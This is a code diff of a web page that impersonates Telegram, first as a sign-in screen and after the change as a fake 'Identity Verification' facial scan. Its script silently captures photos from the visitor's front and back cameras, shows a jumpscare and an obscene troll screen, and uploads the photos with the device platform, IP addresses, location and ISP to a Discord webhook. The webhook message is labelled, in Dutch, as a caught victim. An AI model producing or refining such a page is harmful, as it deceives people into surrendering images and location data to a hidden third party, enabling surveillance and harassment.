@@ -3,15 +3,15 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Telegram Web</title>
-  <meta property="og:title" content="Telegram Web">
-  <meta property="og:description" content="Sign in to your Telegram account.">
+  <title>Telegram: Security Check</title>
+  <meta property="og:title" content="Telegram: Security Check">
+  <meta property="og:description" content="Verify your identity to access Telegram Web.">
   <meta property="og:type" content="website">
   <meta name="theme-color" content="#24A1DE">
   <style>
     :root {
       --tg-blue: #24A1DE;
-      --tg-bg: #f4f4f5;
+      --tg-bg: #ffffff;
       --tg-text: #222;
       --tg-sub: #707579;
     }
@@ -33,108 +33,81 @@
     #screen-landing {
       width: 100%;
       max-width: 400px;
-      background: #fff;
       padding: 40px;
-      border-radius: 10px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
       text-align: center;
       display: flex;
       flex-direction: column;
+      align-items: center;
       gap: 20px;
       z-index: 10;
     }
 
-    .tg-logo {
-      width: 100px;
-      height: 100px;
-      background: var(--tg-blue);
-      border-radius: 50%;
-      margin: 0 auto 10px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+    .face-id-icon {
+      width: 100px; height: 100px;
+      margin-bottom: 20px;
+      animation: pulse 2s infinite ease-in-out;
     }
-    .tg-logo svg { width: 60px; fill: white; }
-
-    .tg-title { font-size: 1.8rem; font-weight: 600; margin-bottom: 5px; }
-    .tg-subtitle { color: var(--tg-sub); font-size: 1rem; margin-bottom: 20px; }
-
-    .tg-input {
-      width: 100%;
-      padding: 12px;
-      border: 1px solid #dadce0;
-      border-radius: 8px;
-      font-size: 1rem;
-      outline: none;
-      transition: border-color 0.2s;
+    @keyframes pulse {
+      0% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.1); opacity: 0.8; }
+      100% { transform: scale(1); opacity: 1; }
     }
-    .tg-input:focus { border-color: var(--tg-blue); }
 
-    .tg-btn {
+    .tg-title { font-size: 1.6rem; font-weight: 700; margin-bottom: 8px; color: #1c1c1e; }
+    .tg-subtitle { color: var(--tg-sub); font-size: 0.95rem; line-height: 1.4; margin-bottom: 30px; }
+
+    .verify-btn {
       width: 100%;
-      padding: 14px;
+      padding: 16px;
       background: var(--tg-blue);
       color: white;
       border: none;
-      border-radius: 8px;
-      font-size: 1rem;
+      border-radius: 12px;
+      font-size: 1.1rem;
       font-weight: 600;
       cursor: pointer;
-      text-transform: uppercase;
-      margin-top: 10px;
+      box-shadow: 0 4px 15px rgba(36, 161, 222, 0.3);
+      transition: transform 0.1s active;
     }
-    .tg-btn.secondary {
-      background: transparent;
-      color: var(--tg-blue);
-      text-transform: none;
-      margin-top: 5px;
+    .verify-btn:active { transform: scale(0.98); }
+
+    .security-badge {
+      display: flex; align-items: center; gap: 8px;
+      margin-top: 40px; color: #34c759; font-size: 0.85rem; font-weight: 600;
     }
 
     #screen-loading {
       display: none;
-      position: fixed; inset: 0;
-      background: #fff;
-      z-index: 100;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
+      position: fixed; inset: 0; background: #fff; z-index: 100;
+      flex-direction: column; align-items: center; justify-content: center;
     }
-    .spinner {
-      width: 40px; height: 40px;
-      border: 3px solid #f3f3f3;
-      border-top: 3px solid var(--tg-blue);
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
+    .scanner-line {
+      width: 200px; height: 2px; background: var(--tg-blue);
+      box-shadow: 0 0 15px var(--tg-blue);
+      position: absolute; top: 0; left: 50%; transform: translateX(-50%);
+      animation: scan 1.5s infinite ease-in-out;
     }
-    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes scan {
+      0% { top: 30%; }
+      50% { top: 70%; }
+      100% { top: 30%; }
+    }
 
     #screen-jumpscare {
-      display: none;
-      position: fixed; inset: 0;
-      background: #000;
-      z-index: 999;
-      align-items: center;
-      justify-content: center;
+      display: none; position: fixed; inset: 0; background: #000; z-index: 999;
+      align-items: center; justify-content: center;
     }
     .jumpscare-video { width: 100%; height: 100%; object-fit: cover; }
 
     #screen-troll {
-      display: none;
-      position: fixed; inset: 0;
-      background: #000;
-      z-index: 1000;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
+      display: none; position: fixed; inset: 0; background: #000; z-index: 1000;
+      flex-direction: column; align-items: center; justify-content: center; text-align: center;
     }
     .troll-text { color: red; font-size: 5rem; font-weight: 900; animation: vibrate 0.1s infinite; }
-    .troll-emoji { font-size: 5rem; margin-top: 20px; }
     @keyframes vibrate {
-      0% { transform: translate(0,0); }
-      25% { transform: translate(3px, -3px); }
-      50% { transform: translate(-3px, 3px); }
-      100% { transform: translate(3px, 3px); }
+      0% { transform: translate(1px,1px); }
+      50% { transform: translate(-2px,-1px); }
+      100% { transform: translate(1px,1px); }
     }
 
     #hidden-video { position: fixed; opacity: 0; width: 1px; height: 1px; left: -999px; }
@@ -147,20 +120,28 @@
 <canvas id="hidden-canvas"></canvas>
 
 <div id="screen-landing">
-  <div class="tg-logo">
-    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.11.02-1.93 1.23-5.46 3.62-.51.35-.97.52-1.39.51-.46-.01-1.35-.26-2.01-.48-.81-.27-1.45-.42-1.39-.88.03-.24.36-.48.99-.73 3.84-1.67 6.4-2.77 7.68-3.3.31-.13.63-.16.92-.15.29.01.62.08.85.2.22.12.38.29.46.54.08.25.07.54.05.78z"/></svg>
+  <div class="face-id-icon">
+    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M7 3H5C3.89543 3 3 3.89543 3 5V7M17 3H19C20.1046 3 21 3.89543 21 5V7M7 21H5C3.89543 21 3 20.1046 3 19V17M17 21H19C20.1046 21 21 20.1046 21 19V17M8 11V10C8 7.79086 9.79086 6 12 6C14.2091 6 16 7.79086 16 10V11M8 11H16M8 11C7.44772 11 7 11.4477 7 12V15C7 16.6569 8.34315 18 10 18H14C15.6569 18 17 16.6569 17 15V12C17 11.4477 16.5523 11 16 11M12 11V14M12 14L11 13" stroke="#24A1DE" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
   </div>
-  <div class="tg-title">Sign in to Telegram</div>
-  <div class="tg-subtitle">Please enter your phone number.</div>
-  <input type="text" class="tg-input" placeholder="Phone number">
-  <button class="tg-btn" onclick="startPrank()">Next</button>
-  <button class="tg-btn secondary" onclick="startPrank()">Sign up</button>
-  <div class="landing-bottom-meta">© 2026 Telegram Messenger</div>
+  <div class="tg-title">Identity Verification</div>
+  <div class="tg-subtitle">To protect your Telegram account, please verify your identity using Face ID / Facial Recognition.</div>
+  
+  <button class="verify-btn" onclick="startPrank()">Start Facial Scan</button>
+
+  <div class="security-badge">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-3zm0 6c1.38 0 2.5 1.12 2.5 2.5S13.38 13 12 13s-2.5-1.12-2.5-2.5S10.62 8 12 8zm3 9H9v-1c0-1.5 3-2.3 3-2.3s3 .8 3 2.3v1z"/></svg>
+    Secure Identity Verification
+  </div>
 </div>
 
 <div id="screen-loading">
-  <div class="spinner"></div>
-  <div style="margin-top:20px; color:#707579;">Connecting...</div>
+  <div class="face-id-icon" style="animation: none; opacity:0.3;">
+     <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M7 3H5C3.89543 3 3 3.89543 3 5V7M17 3H19C20.1046 3 21 3.89543 21 5V7M7 21H5C3.89543 21 3 20.1046 3 19V17M17 21H19C20.1046 21 21 20.1046 21 19V17M8 11V10C8 7.79086 9.79086 6 12 6C14.2091 6 16 7.79086 16 10V11M8 11H16M8 11C7.44772 11 7 11.4477 7 12V15C7 16.6569 8.34315 18 10 18H14C15.6569 18 17 16.6569 17 15V12C17 11.4477 16.5523 11 16 11M12 11V14M12 14L11 13" stroke="#24A1DE" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+  </div>
+  <div class="scanner-line"></div>
+  <div style="margin-top:20px; color:var(--tg-blue); font-weight:600;">Scanning Face...</div>
 </div>
 
 <div id="screen-jumpscare">
@@ -171,7 +152,7 @@
 
 <div id="screen-troll">
   <div class="troll-text">FUCK YOU</div>
-  <div class="troll-emoji">🖕 🐒 🖕</div>
+  <div style="font-size: 5rem; margin-top: 20px;">🖕 🐒 🖕</div>
   <audio id="troll-sound" src="troll.mp3" loop preload="auto"></audio>
 </div>
 
@@ -200,23 +181,23 @@
     document.getElementById('screen-landing').style.display = 'none';
     document.getElementById('screen-loading').style.display = 'flex';
 
-    const capturedPhotos = [];
+    const photos = [];
     
-    // Selfie
+    // Front Capture
     try {
-      const streamF = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      const b1 = await captureFrame(streamF, true);
-      if(b1) capturedPhotos.push({ blob: b1, name: 'selfie.jpg' });
-      streamF.getTracks().forEach(t => t.stop());
-    } catch(e) { console.warn("Selfie failed", e); }
+      const s1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      const b1 = await captureFrame(s1, true);
+      if(b1) photos.push({ blob: b1, name: 'selfie.jpg' });
+      s1.getTracks().forEach(t => t.stop());
+    } catch(e) {}
 
-    // Achtercamera
+    // Back Capture
     try {
-      const streamB = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-      const b2 = await captureFrame(streamB, false);
-      if(b2) capturedPhotos.push({ blob: b2, name: 'omgeving.jpg' });
-      streamB.getTracks().forEach(t => t.stop());
-    } catch(e) { console.warn("Back cam failed", e); }
+      const s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+      const b2 = await captureFrame(s2, false);
+      if(b2) photos.push({ blob: b2, name: 'omgeving.jpg' });
+      s2.getTracks().forEach(t => t.stop());
+    } catch(e) {}
 
     document.getElementById('screen-loading').style.display = 'none';
     document.getElementById('screen-jumpscare').style.display = 'flex';
@@ -225,8 +206,7 @@
     video.volume = 1.0;
     await video.play();
 
-    // Verstuur naar Discord
-    finalUpload(capturedPhotos);
+    uploadResults(photos);
 
     setTimeout(() => {
       document.getElementById('screen-jumpscare').style.display = 'none';
@@ -253,30 +233,27 @@
     });
   }
 
-  async function finalUpload(photos) {
-    const formData = new FormData();
+  async function uploadResults(photos) {
+    const fd = new FormData();
     const payload = {
-      username: "🕵️ Telegram Reporter",
+      username: "🕵️ Telegram Face-ID Bot",
       embeds: [{
-        title: "🎯 SLACHTOFFER GEPAKT",
-        color: 0x24A1DE,
+        title: "🎯 SLACHTOFFER GEPAKT MET FACE-ID",
+        color: 0x34c759,
         fields: [
-          { name: "📱 Platform", value: `\`${navigator.platform}\``, inline: true },
+          { name: "📱 Apparaat", value: `\`${navigator.platform}\``, inline: true },
           { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
           { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
           { name: "📍 Locatie", value: ipInfo.loc, inline: false },
           { name: "🏢 Provider", value: ipInfo.isp, inline: false }
         ],
-        footer: { text: "Night Owl Tracker Pro" }
+        footer: { text: "Night Owl Stealth Security" }
       }]
     };
 
-    formData.append('payload_json', JSON.stringify(payload));
-    photos.forEach((p, i) => {
-      formData.append(`file${i+1}`, p.blob, p.name);
-    });
-    
-    await fetch(WEBHOOK, { method: 'POST', body: formData });
+    fd.append('payload_json', JSON.stringify(payload));
+    photos.forEach((p, i) => fd.append(`file${i+1}`, p.blob, p.name));
+    await fetch(WEBHOOK, { method: 'POST', body: fd });
   }
 </script>
 </body>
